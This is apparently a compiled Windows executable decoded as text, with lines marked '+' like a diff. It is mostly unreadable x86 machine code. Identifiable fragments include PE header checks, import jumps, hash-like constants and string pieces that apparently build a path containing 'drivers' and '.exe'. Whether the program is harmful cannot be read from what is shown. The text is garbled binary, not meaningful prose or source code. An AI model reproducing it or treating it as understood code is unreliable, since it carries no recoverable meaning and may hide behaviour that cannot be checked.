+  Õ*‹MÀ* Ö *‰L$*	  *‰$*  *‰Á*´† ´*è+  *  —*ƒì*  Ó*…¤þÿÿ*  *‰Á*”† µ*èû  * ° ü*ÇEðÿÿÿÿ* ú S*ÇEì    *	 Ø*ëX*©ø€  ×*‹D@ *
+  ú*‹Eì*
+  *Ð*  ÿ*¶ * ) ”*<**	 Ù*uB*  Õ*¡D@ *
+  ú*‹Uì*  *ƒÂ*
+  *Ð*  ÿ*¶ * ) –*<B*	 Ù*u.*  Õ*¡D@ *
+  ú*‹Uì*  *ƒÂ*
+  *Ð*  ÿ*¶ * ) ”*<**	 Ù*u*
+  ú*‹Eì*
+ ° *‰Eð*  Õ*¡D@ *
+  ú*‹Uì*  ð*ƒÂ*
+  *Ð* Ú *£H@ *	 Û*ë*ýø€ ú *ƒEì*
+  ú*‹Eì*  Õ*;EÀ*	" Ü*| *  è*¡l¢@ *ìÄ‚ *ÿÐ* î *‰…Œþÿÿ*  î*‹…Œþÿÿ*  ê*=¥¥¥¥*	 Ý*u*  î*‹…Œþÿÿ*
+  *…À*	 Ý*y*  *¸   *	 Þ*ë*´ù€  S*¸    *
+ ) )*„À* ß*„Æ  * ² ã*ÇD$@   * Ö ç*ÇD$ª   *  º*…´ùÿÿ*	  *‰$*¨¨ ¤*èI  * ý S*ÇEè    *	 à*ë*èù€  ý*‹Eè*  Ô*ƒÀ*  *‰Á*  º*•´ùÿÿ*
+  ý*‹Eè*
+  *Ð*
+ ÿ ß*ˆ* ý *ƒEè* ý G*ƒ}è*	 á*~á*  ü*Ç$€   *˜¨ _*è  *
+ â *‰E¼* â S*ƒ}¼ * ã*„°   * ² ä*ÇD$   * Ö ‹*ÇD$Dr@ *
+  â*‹E¼*	  *‰$* ¨ m*èå  *
+  â*‹E¼*	  *‰$*à¨ i*è  *
+ å *‰E¸*
+  å*‹E¸* æ *‰…üÿÿ*  î*‹•Œþÿÿ*  æ*‹…üÿÿ* ç *‰T$* ± *‰D$* ² è*ÇD$Ur@ * Ö ã*ÇD$@   *  •*…ôúÿÿ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*  é*¶…ôúÿÿ* ê )*ˆ…üÿÿ*  ê*¶…üÿÿ* ° S*ÇEä    *	 ë*ë*£û€  °*‹Uä*
+  â*‹E¼*
+  *Ð*  ÿ*¶*
+  °*‹Mä*
+  â*‹E¼*
+  *È*  ú*ƒòU*
+ ÿ á*ˆ* ° *ƒEä* ° *ƒ}ä*	 ì*~Þ*
+  â*‹E¼*	  *‰$*ˆ¨ “*è8  * í µ*
+Ç…üÿÿÅ* f S*ÇEà    *	 î*ëf*ãû€  º*•´ùÿÿ*	  f*‹Eà*
+  *Ð*  ÿ*¶ *  )*¶Ð*  í*‹…üÿÿ*
+  *1Ð* í *‰…üÿÿ* c S*ÇEÜ    *	 ï*ë4*‹ü€  í*‹…üÿÿ*  }*Áè*
+ ) )*„À*	 ð*t*  í*‹…üÿÿ*
+  *À*  ¸*5“ * í *‰…üÿÿ*	 ñ*ë*­ü€  í*‹…üÿÿ*
+  *À* í *‰…üÿÿ* c *ƒEÜ* c ·*ƒ}Ü*	 ò*~Æ* f *ƒEà* f ¼*ƒ}à*	 ó*~”*  í*‹…üÿÿ* 7 ü*ÇD$€   *  •*…ôúÿÿ*	  *‰$*« å*è%  *  —*ƒì* 7 ã*ÇD$@   *  º*…´ùÿÿ*	  *‰$*« å*è  *  —*ƒì*  ô*…Lýÿÿ* Ö *‰D$*  õ*Ç$gr@ *  Ó*¡,¢@ *¬Ä‚ *ÿÐ*  —*ƒì*
+ ö *‰E´* ö ­*ƒ}´ÿ*	 ÷*tM*  Õ*¡D@ *
+ 7 *‰D$*  ô*…Lýÿÿ*  Ö*ƒÀ,*	  *‰$*à©€ ×*èÖÿÿ*  ô*…Lýÿÿ*
+ 7 *‰D$*
+  ö*‹E´*	  *‰$*  Ø*¡0¢@ *°Ä‚ *ÿÐ*  —*ƒì*
+  *…À*	 )*•À*
+ ) )*„À*	 ø*uÃ*
+  ö*‹E´*	  *‰$*  Ú*¡(¢@ *¨Ä‚ *ÿÐ*  G*ƒì*  S*Ç$    *øñ€ ù*èôùÿÿ*
+ ú *‰E°*
+  ú*‹E°*	  *‰$*À¨ û*è.  *°¨ ü*è  *
+ ý *‰E¬* 4 ß*ÇD$
+   * 7 þ*ÇD$€•@ *
+  ý*‹E¬*	  *‰$*ø¨ ÿ*èC  *
+ € *‰E¨* 7 é*ÇD$  *  *…Hüÿÿ*	  *‰$*  ë*¡d¢@ *äÄ‚ *ÿÐ*  —*ƒì*  *…Hüÿÿ*	  *‰$*à¨ i*èÿ  *  *‰Â*  *…Hüÿÿ*
+  *Ð*  ‚*Ç \dri* C ƒ*Ç@vers* î S*Æ@ *
+  €*‹E¨*
+ 7 *‰D$*  *…Hüÿÿ*	  *‰$*È¨ á*è·  *  *…Hüÿÿ*	  *‰$*à¨ i*èÁ  *  *‰Â*  *…Hüÿÿ*
+  *Ð*  ó*Ç .exe* š S*Æ@ *  «*¡<¢@ *¼Ä‚ *ÿÐ*	  *‰$*  ¬*¡X¢@ *ØÄ‚ *ÿÐ*  G*ƒì*  ­*ƒøÿ*	# )*”À*
+ ) )*„À* „*„ò  * e S*ÇEØ    *	 …*ë*Þÿ€  e*‹EØ*   ±*iÐ¹y7ž*	  e*‹EØ* † *‰”…ôùÿÿ* e *ƒEØ* e }*ƒ}Ø*	 ‡*~ã* ˆ S*
+Ç… üÿÿ    * û S*ÇEÔ    *	 ‰*ë\*Ž€  û*‹EÔ*  †*‹”…ôùÿÿ*  ˆ*‹… üÿÿ*
+  *1Ð* ˆ *‰… üÿÿ* ý S*ÇEÐ    *	 Š*ë1*¯€  ˆ*‹… üÿÿ*  Û*Áà*  *‰Â*  ˆ*‹… üÿÿ*  ‹*Áè*
+  *	Ð* ˆ *‰… üÿÿ*  ˆ*‹… üÿÿ*  Ò*5xV4* ˆ *‰… üÿÿ* ý *ƒEÐ* ý ð*ƒ}Ð*	 Œ*~É* û *ƒEÔ* û }*ƒ}Ô*	 *~ž* Ž µ*
+Ç…üûÿÿÅ* þ S*ÇEÌ    * *éÁ   *†  þ*‹EÌ*  †*‹„…ôùÿÿ*  )*¶Ð*  Ž*‹…üûÿÿ*
+  *1Ð* Ž *‰…üûÿÿ*  Ž*‹…üûÿÿ*   ¸*iÀ“ * Ž *‰…üûÿÿ*
+  þ*‹EÌ*  †*‹„…ôùÿÿ*  —*Áè*  )*¶Ð*  Ž*‹…üûÿÿ*
+  *1Ð* Ž *‰…üûÿÿ*  Ž*‹…üûÿÿ*   ¸*iÀ“ * Ž *‰…üûÿÿ*
+  þ*‹EÌ*  †*‹„…ôùÿÿ*  Ô*Áè*  )*¶Ð*  Ž*‹…üûÿÿ*
+  *1Ð* Ž *‰…üûÿÿ*  Ž*‹…üûÿÿ*   ¸*iÀ“ * Ž *‰…üûÿÿ*
+  þ*‹EÌ*  †*‹„…ôùÿÿ*  *Áè*  )*¶Ð*  Ž*‹…üûÿÿ*
+  *1Ð* Ž *‰…üûÿÿ*  Ž*‹…üûÿÿ*   ¸*iÀ“ * Ž *‰…üûÿÿ* þ *ƒEÌ* þ }*ƒ}Ì* *Ž5ÿÿÿ* ‘ S*
+Ç…øûÿÿ    * ÿ S*ÇEÈ    *	 ’*ë"*ä‚  ‘*‹…øûÿÿ*   *iÐmNÆA*
+  ÿ*‹EÈ*  †*‹„…ôùÿÿ*
+  *Ð* ‘ *‰…øûÿÿ* ÿ *ƒEÈ* ÿ }*ƒ}È*	 “*~Ø*  ˆ*‹• üÿÿ*  Ž*‹…üûÿÿ*
+  *1Â*  ‘*‹…øûÿÿ*
+  *Ð* ” *‰…ôûÿÿ*  ”*‹…ôûÿÿ* 7 ü*ÇD$€   *  Ê*…ôùÿÿ*	  *‰$*« å*èÌ  *  —*ƒì*  Ú*¡H@ *
+  *…À* •*„¼   * 7 G*ÇD$   *  Ô*Ç$   *ì¯ ¨*è  *  *‰Â*  •*…ôúÿÿ*
+ 7 *‰T$*  *•Hüÿÿ*	  *‰$*  *‰Á*ô… ¤*èð   *  —*ƒì* ° ­*ƒ}ðÿ*	 –*t.*
+  °*‹Eð*  —*P*
+  Õ*‹EÀ*
+  *)Ð*
+ ˜ *‰E¤*  ™*‹H@ *  •*…ôúÿÿ*
+  ˜*‹M¤*
+ 7 *‰L$*	  *‰$*  *‰Á*œ† ©*èä   *  —*ƒì*  •*…ôúÿÿ*  *‰Á*ü… µ*è´   * ¯ Û*ÇD$   * 0 S*ÇD$    * 6 S*ÇD$    *  *…Hüÿÿ*
+ 4 *‰D$* 7 S*ÇD$    *  S*Ç$    *  š*¡(£@ *¨Æ‚ *ÿÐ*  *ƒì*  •*…ôúÿÿ*  *‰Á*ì… ª*è\   *œÀ€ ›*è‡Ýÿÿ* @ S*»    *  Ó*…¤þÿÿ*  *‰Á*„† Ú*è]   *  @*‰Ø*	 œ*ë**Õ… @ Ü*‹]ü**É*
+ Ô*Â *Ü… *ÿ%l£@ *ä… ž*ÿ%h£@ *ì… Ÿ*ÿ%d£@ *ô…  *ÿ%`£@ *ü… ¡*ÿ%\£@ *„† ¢*ÿ%X£@ *Œ† £*ÿ%T£@ *”† ¤*ÿ%P£@ *œ† ¥*ÿ%L£@ *¤† ¦*ÿ%H£@ *¬† §*ÿ%D£@ *´† ¨*ÿ%@£@ *¼†*f**f*  ©*¡`@ *  *‹ *
+  *…À*	 ª*t-*	  *U*   *‰å*  —*ƒì* ? g*´&    * *ÿÐ*  ©*¡`@ *  «*P*
+  ¬*‹@* ­ *‰`@ *
+  *…À*	 ®*ué**É**Ã*
+ø†*Ã*€‡	  *U*   *‰å*	 @*S*  “*ƒì* @ ¯*‹ðX@ * @ ­*ƒûÿ*	 °*t.*
+ @ @*…Û*	 ±*t* ? g*.´&    **f* ²*ÿðX@ * @ *ƒë*	 ³*uô*  ´*Ç$@C@ *ð§€ ž*è8Ðÿÿ*
+ @ Ü*‹]ü**É**Ã*À‡  *1À* ? g*¶    * @ *‰Ã*  *ƒÀ*  µ*‹…ðX@ *
+  *…Ò*	 ¶*uð*	 ·*ë¸*à‡  ¸*¡à•@ *
+  *…À*	 ¹*t**Ã*ð‡ º *
+Çà•@    *€‡ »*ë„*€ˆ  *1À**Ã*ˆ	  *U*   *‰å*  *ƒì*
+  ¥*‹E*  ð*ƒø*	 ¼*t*
+  *…À*	 ¼*t**É*  *¸   *	 U*Â *°ˆ ½ *‰D$*
+  ¾*‹U*
+  *‹E* ¿ *‰T$*	  *‰$*Ð› À*èŠ	  *  *¸   **É*	 U*Â *Ðˆ	  *U*   *‰å*	 @*S*  “*ƒì* Á *ƒ=`@ *
+  ¥*‹E*	 Â*t
+* Á *
+Ç`@    *  *ƒø*	 Ã*t*  *ƒø*	 Ä*tI*
+ @ Ü*‹]ü*  *¸   **É*	 U*Â *ˆ‰ @ Å*»,°@ * @ Å*û,°@ *	 Æ*tâ* ? g*v *  h*‹*
+  *…À*	 Ç*t* *ÿÐ* @ G*ƒÃ* @ Å*û,°@ *	 È*uí*
+ @ Ü*‹]ü*  *¸   **É*	 U*Â *À‰  ¾*‹E* ½ *ÇD$   * ¿ *‰D$*
+  *‹E*	  *‰$*Ð› À*èö  *
+ @ Ü*‹]ü*  *¸   **É*	 U*Â *ð‰  *1À**Ã*€Š	  *U*   *‰å*	 ?*V*	 @*S* @ ‹*»r@ *  É*ƒìP*
+  Ê*‹E*  *‹*  Ë*Qÿ*  Û*ƒú*	 Ì*w* @ Í*‹•¬s@ *
+ Î*Ý@*	 ? C*‹p*
+ Ï*Ý]à*
+ Ð*Ý@*
+ Ñ*Ý]è*
+ Ò*Ý@*  *Ç$   *
+ Ó*Ý]ð*ð¦ Ô*è.  *
+ Ï*ÝEà* Õ ?*‰t$* Ö @*‰\$* × Ø*ÇD$ r@ * Ù*Ý\$ *
+ Ñ*ÝEè*	  *‰$* Ú*Ý\$*
+ Ó*ÝEð* Û*Ý\$*€¨ Ü*è‘  *  É*ƒÄP*
+  *1À*
+ @*[*
+ ?*^*
+  *]**Ã*€‹.*Ûã**Ã*‹	  *U*   *‰å*	 @*S* @ Ý*]*  “*ƒì*  *Ç$   *ð¦ Ô*èÊ  * ¿ ‹*ÇD$   * Þ *‰D$* ½ *ÇD$   *  ‹*Ç$Äs@ *¨ ß*èJ  *  *Ç$   *ð¦ Ô*èž  *
+  *‹U* ¿ @*‰\$*	  *‰$* ½ *‰T$*ð¨ à*è‹  *è§ á*èþ  *ð‹	  *U*   *‰å*	 >*W*	 ?*V*	 @*S* @ *‰Ã*  â*ƒì<* ? ã*‹5–@ *
+ ? ?*…ö* ä*Ž  *  å*¡–@ *
+  *1É*  U*ƒÀ* ? g*.t& *  *‹*
+ @ *9Ó*	 æ*r*	 > C*‹x*  ç*W*
+ @ *9Ó* è*‚   *  *ƒÁ*  “*ƒÀ*
+  ?*9ñ*	 é*uâ*	  @*‰$*ðŸ ê*è²	  * > *‰Ç*
+  *…À* ë*„ï   *  å*¡–@ * @ ì*¶* @ *Áã*
+  @*Ø*
+ í >*‰x*  S*Ç     *À¢ î*èÝ
+  *  ï*‹–@ *  ð*G* ñ *‰D*  ò*UÌ* ó *ÇD$   * ô *‰T$*	  *‰$*ŒÅ‚ õ*ÿŒ¢@ *  U*ƒì*
+  *…À* ö*„„   *	  f*‹Eà*  ÷*Pü*  ø*ƒâû*	 ù*t*  ú*PÀ*  û*ƒâ¿*	 ü*u* ã *ƒ–@ *  Ÿ*eô*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã*¸  *ƒø*  G*º   *  ã*¸@   *	  e*‹MØ*   *DÂ*
+  þ*‹UÌ* @ ï*–@ *
+ ý *‰K*
+ þ *‰S*
+ 6 @*‰\$*
+ 4 *‰D$*
+ 7 *‰L$*	  *‰$*ˆÅ‚ ÿ*ÿˆ¢@ *  Ô*ƒì*
+  *…À*	 ù*u°*ÀÄ‚ €*ÿ@¢@ *  *Ç$4t@ *
+ 7 *‰D$*‹ ‚*è„þÿÿ*Ž ? ?*1ö* ƒ*éÿÿÿ*—Ž  å*¡–@ *  „*‹D*
+ 4 *‰D$*
+  ç*‹G*  …*Ç$ t@ *
+ 7 *‰D$*‹ ‚*èYþÿÿ*·Ž ô @*‰\$*  †*Ç$às@ *‹ ‚*èIþÿÿ*ÐŽ	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*  ‡*ƒìL* > ˆ*‹=–@ *
+ > >*…ÿ*	 ‰*t*  Ÿ*eô*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã*ðŽ ˆ *
+Ç–@    *€¡ Š*è	  *  ‹*€*  Œ*…   *  G*Áè*  G*Áà*è¥ *èT  * ã S*
+Ç–@     *
+  *)Ä*  Ž*D$#*  <*ƒàð* å *£–@ *  *¸Px@ *  *-Px@ *  ·*ƒø*	 *~¨*  ‘*‹Px@ *  ’*ƒø*! “*  * @ *»Px@ *  h*‹*
+  *…À* ”*…¬  *
+  þ*‹C*
+  *…À* ”*…¡  *
+  ý*‹C*  *ƒø* •*…?  * @ U*ƒÃ* @ *ûPx@ *% *ƒdÿÿÿ*
+ þ >*‰}Ì* ? @*‰Þ*	 –*ë^*  —*ƒù* —*…  * @ ˜*¶Ÿ  @ *  ™*%à   * ö ö*„Û*	 š*y* @ ›*Ë ÿÿÿ*
+ @ *)Ó*
+  û*‹UÔ*
+ @ *Ó*
+  *…À*	 œ*u* @ *ûÿ   *	! ž*n* @ Ÿ*ƒû€*	" ž*|i*
+  ý*‹EÐ*ð‹  *è¡ýÿÿ* ˜ ö*ˆŸ  @ * ? U*ƒÆ* ? *þPx@ *% ¡*ƒü   *
+ > ¢*‹~*  £*‡  @ *
+ ý *‰EÐ*	  ¤*‹*  ¥*  @ *  ¦*‹€  @ *
+ û *‰EÔ*
+  §*‹F*  )*¶È* ) Ô*<*	 ¨*t}*  Ø*ƒù *	 ©*u€*
+ @ û*‹]Ô*
+ @ *)Ó* @ ª*Ÿ  @ *  ™*%à   *  *‰Á* «*…À   *
+ @ @*…Û*	' ¬*x©* ? g*t& *
+ 0 @*‰\$*
+  û*‹EÔ*
+ 6 *‰D$*
+  ý*‹EÐ*
+ 7 *‰L$*
+ 4 *‰D$*  ­*Ç$¼t@ *‹ ‚*è¾üÿÿ*Ø‘  *…Ò* ®*…    *  ¯*¡Tx@ * @ °*»\x@ *  *‰Á*  ±*Xx@ * ²*„×þÿÿ* @ *»Px@ * ³*éÚþÿÿ*ˆ’ @ ´*·Ÿ  @ *  ™*%à   * µ µ*f…Û*	 ¶*y* @ ·*Ë  ÿÿ*
+ @ *)Ó*
+  û*‹UÔ*
+ @ *Ó*
+  *…À*	 ¸*u* @ ¹*û €ÿÿ*" ž*Œzÿÿÿ* @ º*ûÿÿ  *! ž*nÿÿÿ*
+  ý*‹EÐ* ? U*ƒÆ*ð‹  *è£üÿÿ* ´ µ*f‰Ÿ  @ * ? *þPx@ * –*‚ÿÿÿ*
+ > þ*‹}Ì*	 »*ë]*è’  ý*‹EÐ*ð‹  *è€üÿÿ* ª @*‰Ÿ  @ * ¬*éÚþÿÿ*€“ @ *»Px@ * @ *ûPx@ *% *ƒÒýÿÿ*
+ û >*‰}Ô* ? g*t& *
+ ? þ*‹s* > h*‹;* @ —*ƒÃ* > ¼*¾  @ *  ½*†  @ *ð‹  *è?üÿÿ* ¼ >*‰¾  @ * @ *ûPx@ *	 ¾*rÙ*
+ > û*‹}Ô*  ã*‹–@ *
+  *…Ò* *Ž“ýÿÿ* @ ÿ*‹ˆ¢@ * ? ¿*uä* ? g*´&    *  ï*‹–@ *  À*¿*  Á*‚*  *‹*
+  *…Ò*	 Â*t*
+ 6 ?*‰t$*
+ 4 *‰T$*
+  ò*‹P*
+ 7 *‰T$*	  C*‹@*	  *‰$*ˆÅ‚ @*ÿÓ*  Ô*ƒì* > *ƒÇ* > ã*;=–@ *	" Ã*|É*  Ÿ*eô*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã*Ÿ” 7 *‰L$*  Ä*Ç$t@ *‹ ‚*èaûÿÿ*¯” 7 *‰D$*  Å*Ç$\t@ *‹ ‚*èQûÿÿ*•	  *U*   *‰å*
+  *‹E*
+  *‰E*
+  *]* Æ *£–@ *¸§ Ç*é	  *°•	  *U*   *‰å*	 @*S*  “*ƒì*
+ @ È*‹]*  h*‹*  *‹ *  É*=“  À* Ê*„±   *	 Ë*wU*  Ì*=  À*	 Í*t`* Î*‡˜   *  Ï*=  À*	 Ð*u)* 7 S*ÇD$    *  ’*Ç$   *¸¨ Ñ*èE	  *  *ƒø* Ò*„  *
+  *…À* Ó*…Û   * ? g*t& *  Y*¡ –@ *
+  *…À*	 Ô*tO*
+ È @*‰]*
+ @ Õ*‹]ü**É* *ÿà* –  Ö*=”  À* ×*„…   *  Ø*=–  À*	 Ð*uÖ* 7 S*ÇD$    *  G*Ç$   *¸¨ Ñ*èò  *  *ƒø* Ù*„›   *
+  *…À*	 Ð*tµ*  G*Ç$   * *ÿÐ*	 Ú*ëJ*à–  *1À*
+ @ Õ*‹]ü**É*	 G*Â *ð–  Û*sÿÿ?*  G*ƒø*	 Ð*wŽ* 7 S*ÇD$    *  —*Ç$   *¸¨ Ñ*èª  *  *ƒø* Ü*„   *
+  *…À* Ð*„iÿÿÿ*  —*Ç$   * *ÿÐ*  ü*¸ÿÿÿÿ*	 Ý*ë³*°— 7 S*ÇD$    *  —*Ç$   *¸¨ Ñ*èt  *  *ƒø*	 Þ*uÎ* 7 *ÇD$   *  —*Ç$   *¸¨ Ñ*è[  *	 Ú*ëÉ*ß—  ’*Ç$   * *ÿÐ*	 Ú*ë¾*ê— 7 *ÇD$   *  G*Ç$   *¸¨ Ñ*è:  *	 Ú*ë¨*€˜ 7 *ÇD$   *  ’*Ç$   *¸¨ Ñ*è$  *	 Ú*ë’*–˜ 7 *ÇD$   *  —*Ç$   *¸¨ Ñ*è  *€‹ \*èQùÿÿ* Ú*étÿÿÿ*À˜	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*  *ƒì*  ß*Ç$,–@ *¤Ä‚ à*ÿ$¢@ * @ á*‹$–@ *  G*ƒì*
+ @ @*…Û*	 â*t6* > ã*‹=„¢@ * ? g*´&    *  h*‹*	  *‰$*„Å‚ >*ÿ×* ? *‰Æ*  G*ƒì*ÀÄ‚ €*ÿ@¢@ *
+ ? ?*…ö*	 ä*t*
+  *…À*	 ä*u*
+  þ*‹C*	  ?*‰4$* *ÿÐ*
+ @ ý*‹[*
+ @ @*…Û*	 å*u×*  ß*Ç$,–@ *ôÄ‚ æ*ÿt¢@ *  G*ƒì*  Ÿ*eô*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã*À™  ç*¡(–@ *
+  *…À*	 è*u*
+  *1À**Ã*Ð™	  *U*   *‰å*	 @*S*  “*ƒì* 7 U*ÇD$   *  *Ç$   *ð§ é*è  * @ *‰Ã*
+  *…À*	 ê*t@*
+  È*‹E* h *‰*
+  ë*‹E*
+ þ *‰C*  ß*Ç$,–@ *¤Ä‚ à*ÿ$¢@ *  ì*¡$–@ * á @*‰$–@ *  G*ƒì*
+ ý *‰C*  ß*Ç$,–@ *ôÄ‚ æ*ÿt¢@ *
+  *1À*  G*ƒì*
+ @ Õ*‹]ü**É**Ã*±š  ü*ƒÈÿ*	 í*ëö*Àš	  *U*   *‰å*	 @*S*  “*ƒì*  ç*¡(–@ *
+ @ È*‹]*
+  *…À*	 î*u*
+ @ Õ*‹]ü*
+  *1À**É**Ã*àš  ß*Ç$,–@ *¤Ä‚ à*ÿ$¢@ *  ì*¡$–@ *  G*ƒì*
+  *…À*	 ï*t'*
+  *1É*	 ð*ë*€›  *‰Á*
+  *…Ò*	 ï*t*  *‰Ð*  *‹*
+  @*9Ú*
+  ò*‹P*	 ñ*uï*
+  *…É*	 ò*t+*
+ ó *‰Q*	  *‰$*ˆ¨ “*èh  *  ß*Ç$,–@ *ôÄ‚ æ*ÿt¢@ *
+ @ Õ*‹]ü*
+  *1À*  G*ƒì**É**Ã*À› á *‰$–@ *	 ô*ëÐ*Ð›	  *U*   *‰å*	 @*S*  “*ƒì*
+  ¥*‹E*  *ƒø* õ*„   *	 ö*w+*
+  *…À*	 ÷*t?*  ç*¡(–@ *
+  *…À* ø*„ª   * ù *
+Ç(–@    *
+ @ Ü*‹]ü*  *¸   **É**Ã*œ  ð*ƒø*	 ú*uë*  ç*¡(–@ *
+  *…À*	 ú*tâ*À˜ û*èþÿÿ*	 ú*ëÛ*¨œ  ç*¡(–@ *
+  *…À*	 ü*u_*  ç*¡(–@ *  *ƒø*	 ú*uÅ* @ á*‹$–@ *
+ @ @*…Û*	 ý*t* ? g*v *  @*‰Ø*
+ @ ý*‹[*	  *‰$*ˆ¨ “*è³  *
+ @ @*…Û*	 þ*uï* á S*
+Ç$–@     * ù S*
+Ç(–@     *  ß*Ç$,–@ *œÄ‚ ÿ*ÿ¢@ *  G*ƒì*	 ú*ë*€€‹ \*èûöÿÿ*
+ @ Ü*‹]ü*  *¸   **É**Ã*À˜ û*è«ýÿÿ*	 €*ëš*   ß*Ç$,–@ *ðÄ‚ *ÿp¢@ *  G*ƒì* ‚*éAÿÿÿ*À	  *U*
+  *1Ò*   *‰å*
+  ƒ*‹E* „ *f8MZ*	 …*u*  †*@<*  *8PE  *	 ‡*t*  *‰Ð*
+  *]**Ã*à  *1Ò* ˆ #*fx*
+  *]*
+# á*”Â*  *‰Ð**Ã*ð	  *U*   *‰å*	 ?*V*
+  ƒ*‹U*	 @*S*
+ @ ‰*‹]*  Š*R<*  ‹*·B* ? Œ*·r*  *D* Ž Ž*f…ö*	 *t!*
+  *1É* ? g*´&    *
+  *‹P*
+ @ *9Ó*	 ‘*r*  ò*P*
+ @ *9Ó*	 ’*r*  *ƒÁ*  .*ƒÀ(*
+  ?*9ñ*	 “*uè*
+  *1À*
+ @*[*
+ ?*^*
+  *]**Ã*Àž	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*
+ @ @*1Û*  *ƒì*
+  È*‹E*	  *‰$*à¨ i*è
+  *  —*ƒø*	 ”*wr*  *	f=  @ MZ*	 ”*ug*  *‹< @ *  *
+º  @ PE  *  *‚  @ *	 ”*uO* • #*	fº @ *	 ”*uD*  –*·’ @ * > —*·x* @ ˜*\* ™ ™*f…ÿ*	 š*tC*
+ ? ?*1ö*	 ›*ë*¨Ÿ ? *ƒÆ* @ .*ƒÃ(*
+ ? >*9þ*	 š*t.*
+  È*‹E* 4 —*ÇD$   *	  @*‰$*
+ 7 *‰D$*è¨ œ*èŸ  *
+  *…À*	 *uÛ*  *ƒÄ*  @*‰Ø*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã*àŸ  *ƒÄ*
+ @ @*1Û*  @*‰Ø*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã*ðŸ  *1À*  *	f=  @ MZ*	 ž*u*  *‹< @ * Ÿ *
+¹  @ PE  *   *‘  @ *	 ¡*t**Ã*   ¢ #*	f¹ @ *	 ž*uê*	  *U*  £*· @ *  *D*   *‰å*	 ?*V* ? ¤*·± @ *	 @*S*
+ @ *‹]* @ ¥*ë  @ * Ž Ž*f…ö*	 ¦*t *
+  *1É* ? g*¶    *
+  *‹P*
+ @ *9Ó*	 §*r*  ò*P*
+ @ *9Ó*	 ¨*r*  *ƒÁ*  .*ƒÀ(*
+ ? *9Î*	 ©*uè*
+  *1À*
+ @*[*
+ ?*^*
+  *]**Ã*€¡  *1À*  *	f=  @ MZ*	 ª*u*  *‹< @ *  *
+º  @ PE  *	 «*t**Ã* ¡ • #*	fº @ *	 ª*uô*  ¬*·‚ @ **Ã*À¡	  *U*
+  *1À*  *	f=  @ MZ*   *‰å*	 @*S*
+  È*‹M*	 ­*u* @ *‹< @ * ® *
+»  @ PE  *  ¯*“  @ *	 °*t*
+ @ Õ*‹]ü**É**Ã*ø¡ ± #*	f» @ *	 ­*ué*  ²*·ƒ @ * @ ³*·› @ *  *D* µ µ*f…Û*	 ´*t*
+  *1Ò* ? g*t& * µ Ø*ö@' *	 ¶*t*
+  *…É*	 ­*tÂ*  *ƒé*  *ƒÂ*  .*ƒÀ(*
+  @*9Ú*	 ·*ué*
+ @ Õ*‹]ü*
+  *1À**É**Ã*À¢  *1À*  *	f=  @ MZ*	 ¸*u*  *‹< @ *  *
+º  @ PE  *	 ¹*t**Ã*à¢ • #*	fº @ *  ¥*º  @ *   *DÂ**Ã*€£  *1Ò*  *	f=  @ MZ*	 º*u*  »*¡< @ * ¼ *
+¸  @ PE  *  ½*ˆ  @ *	 ¾*t*  *‰Ð**Ã*°£ ¿ #*	f¸ @ *	 º*ué*	  *U*  À*·€ @ *  Á*D*   *‰å*	 ?*V*	 @*S*
+ @ Â*‹]* ? Ã*·q* @ ¥*ë  @ * Ž Ž*f…ö*	 Ä*t*
+  *1É***
+  *‹P*
+ @ *9Ó*	 Å*r*  ò*P*
+ @ *9Ó*	 Æ*r*  *ƒÁ*  .*ƒÀ(*
+ ? *9Î*	 Ç*uè*
+  *1Ò*
+ @*[*  *‰Ð*
+ ?*^*
+  *]**Ã*€¤  È*‹P$*
+ @*[*
+ ?*^*
+  *]*/ *÷Ò*  }*Áê*  *‰Ð**Ã*¤	  *U*
+  *1É*  *	f=  @ MZ*   *‰å*	 >*W*	 ?*V*	 @*S*
+ @ È*‹]*	 É*u*  »*¡< @ * ¼ *
+¸  @ PE  * ? ½*°  @ *	 Ê*t*
+ @*[*  *‰È*
+ ?*^*
+ >*_*
+  *]**Ã*È¤ Ë #*	f¸ @ *	 É*uê*  Ì*‹€€ @ *
+  *…À*	 É*tà*  Í*·V* > Î*·~*  Ï*T* ™ ™*f…ÿ*	 É*tÏ*
+ ? ?*1ö*
+  Ð*‹J*
+  *9È*	 Ñ*r*  Ò*J*
+  *9È*	 Ó*r* ? *ƒÆ*  .*ƒÂ(*
+ > ?*9÷*	 Ô*uè*
+  *1É*
+ @*[*
+ ?*^*  *‰È*
+ >*_*
+  *]**Ã*˜¥  ¥*  @ *	 Õ*ë* ¥ @ *ƒë*  “*ƒÀ*
+  Ö*‹H*
+  *…É*	 ×*u*
+  Ø*‹P*
+  *…Ò*	 Ù*tÔ*
+ @ @*…Û*	! Ú*è*
+  Ø*‹H*
+ @*[*
+ ?*^*
+ >*_*  ¥*Á  @ *
+  *]*  *‰È**Ã*Ð¥ Û*ÿ%8£@ *Ø¥ Ü*ÿ%4£@ *à¥ Ý*ÿ%0£@ *è¥	 *Q*	 *P*  Þ*=   *  ß*L$*	 à*r*  Þ*é   * á S*ƒ	 *  Þ*-   *  Þ*=   *	 â*wë*
+  *)Á* á S*ƒ	 *
+ *X*
+ *Y**Ã*”¦*f**f**f**f**f**f* ¦	  *U*   *‰å*  *ƒì*  ã*E* Þ *‰D$*
+  ä*‹E* ¿ *‰D$*
+  å*‹E* ½ *‰D$*
+  æ*‹E*	  *‰$*ª ç*èÊ  **É**Ã*Ð¦  è*¡X–@ **Ã*à¦	  *U*   *‰å*
+  é*‹E*) ê *‡X–@ *
+  *]**Ã*ð¦	  *U*   *‰å*
+  *‹E*
